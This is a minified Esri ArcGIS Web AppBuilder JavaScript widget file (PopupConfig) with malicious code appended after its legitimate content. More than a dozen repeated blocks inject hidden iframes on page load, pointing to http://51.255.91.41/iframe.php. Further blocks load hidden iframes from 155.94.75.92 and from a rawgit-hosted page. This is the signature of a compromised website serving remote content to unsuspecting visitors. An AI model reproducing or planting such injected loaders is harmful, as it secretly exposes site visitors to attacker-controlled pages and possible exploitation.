// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Geoprocessing/PopupConfig.html":'\x3cdiv style\x3d"width:560px;"\x3e\r\n\t\x3ctable class\x3d"popup-config-layout" style\x3d"width:100%;table-layout:fixed;"\x3e\r\n\t\t\x3ccolgroup\x3e\r\n\t\t\t\x3ccol width\x3d"auto"\x3e\x3c/col\x3e\r\n\t\t\t\x3ccol width\x3d"370px"\x3e\x3c/col\x3e\r\n\t\t\t\x3ccol width\x3d"70px"\x3e\x3c/col\x3e\r\n\t\t\x3c/colgroup\x3e\r\n\t\t\x3ctbody\x3e\r\n\t\t\t\x3ctr data-dojo-attach-point\x3d"titleTR"\x3e\r\n\t\t\t\t\x3ctd nowrap\x3e\r\n\t\t\t\t\t\x3cspan\x3e${nls.title}\x3c/span\x3e\r\n\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\x3cinput data-dojo-attach-point\x3d"titleTextBox" data-dojo-type\x3d"dijit/form/TextBox" style\x3d"width:100%;" /\x3e\r\n\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"btnAdd" data-dojo-type\x3d"dijit/form/DropDownButton"\x3e\r\n\t\t\t\t\t\t\x3cspan\x3e${nls.add}\x3c/span\x3e\r\n\t\t\t\t\t\t\x3cdiv data-dojo-type\x3d"dijit/TooltipDialog"\x3e\r\n\t\t\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"menu" data-dojo-type\x3d"dijit/Menu"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\x3c/td\x3e\r\n\t\t\t\x3c/tr\x3e\r\n\t\t\t\x3ctr data-dojo-attach-point\x3d"fieldsTR"\x3e\r\n\t\t\t\t\x3ctd nowrap\x3e\r\n\t\t\t\t\t\x3cspan\x3e${nls.fields}\x3c/span\x3e\r\n\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3ctd colspan\x3d"2" data-dojo-attach-point\x3d"fieldsTableTd"\x3e\r\n\t\t\t\t\x3c/td\x3e\r\n\t\t\t\x3c/tr\x3e\r\n\t\t\x3c/tbody\x3e\r\n\t\x3c/table\x3e\r\n\x3c/div\x3e\r\n'}});
define("dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./PopupConfig.html dojo/_base/lang dojo/_base/html dojo/_base/array dojo/Evented esri/request dijit/MenuItem jimu/dijit/SimpleTable dijit/form/TextBox dijit/form/DropDownButton dijit/TooltipDialog dijit/Menu".split(" "),function(g,h,k,l,m,b,d,e,n,p,f,q){return g([h,k,l,n],{_def:null,declaredClass:"jimu.dijit.PopupConfig",baseClass:"jimu-dijit-popup-config",templateString:m,url:null,title:null,
fields:null,config:null,showTitle:!0,postMixInProperties:function(){this.nls=window.jimuNls.popupConfig},postCreate:function(){this.inherited(arguments);this._initFieldsTable();this.clear();this.showTitle?(d.setStyle(this.titleTR,"display",""),this.title&&this.titleTextBox.set("value",this.title)):d.setStyle(this.titleTR,"display","none");this.fields?this.setFields(this.fields):this.url&&this.setUrl(this.url)},getConfig:function(){var a={title:b.trim(this.titleTextBox.get("value")),fields:[]},c=this.fieldsTable.getRows();
e.forEach(c,b.hitch(this,function(c){var b=this.fieldsTable.getRowData(c);a.fields.push({name:b.name,alias:b.alias,type:c.fieldType,visible:b.visibility})}));return a},setUrl:function(a){if("string"===typeof a)return this.url=a=b.trim(a),this.clear(),this._requestLayerInfo(a)},setFields:function(a){a instanceof Array&&this._setFields(a)},clear:function(){this.fieldsTable.clear();this._resetMenu();this._addEmptyMenuItem()},_initFieldsTable:function(){d.empty(this.fieldsTableTd);var a=[{name:"visibility",
title:this.nls.visibility,type:"checkbox",onChange:b.hitch(this,this._onFieldVisibleChange)},{name:"name",title:this.nls.name,type:"text",editable:!1},{name:"alias",title:this.nls.alias,type:"text",editable:!0},{name:"actions",title:this.nls.actions,type:"actions",actions:["up","down"]}];this.fieldsTable=new q({fields:a});this.fieldsTable.placeAt(this.fieldsTableTd)},_onFieldVisibleChange:function(){var a=this.fieldsTable.getRows();e.every(a,function(a){return!1===this.fieldsTable.getRowData(a).visibility},
this)?this.emit("noVisibleField"):this.emit("hasVisibleField")},_resetMenu:function(){var a=this.menu.getChildren();e.forEach(a,b.hitch(this,function(a){this.menu.removeChild(a)}))},_addEmptyMenuItem:function(){var a=new f({label:this.nls.noField,onClick:b.hitch(this,function(){var a=this.menu.getParent();d.setStyle(a.domNode.parentNode,"display","none")})});this.menu.addChild(a)},_setFields:function(a){this._resetMenu();this.fields=e.filter(a,function(a){return"esriFieldTypeGeometry"!==a.type});
0<this.fields.length?e.forEach(this.fields,b.hitch(this,function(a){this._addMenuItem(a);this._addRow(a)})):this._addEmptyMenuItem()},_requestLayerInfo:function(a){this._def&&this._def.cancel();this._def=p({url:a,content:{f:"json"},handleAs:"json",callbackParamName:"callback"});this._def.then(b.hitch(this,function(a){a&&a.fields&&this._setFields(a.fields)}),b.hitch(this,function(a){console.error("request layer info failed",a)}));return this._def},_addMenuItem:function(a){var c=new f({label:a.name+
" {"+a.name+"}",onClick:b.hitch(this,function(){var b=this.titleTextBox.get("value")+"${"+a.name+"}";this.titleTextBox.set("value",b);b=this.menu.getParent();d.setStyle(b.domNode.parentNode,"display","none")})});this.menu.addChild(c)},_addRow:function(a){var b=this.fieldsTable.addRow({visibility:!1!==a.visible,name:a.name,alias:a.alias||a.name});b.success&&(b.tr.fieldType=a.type)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});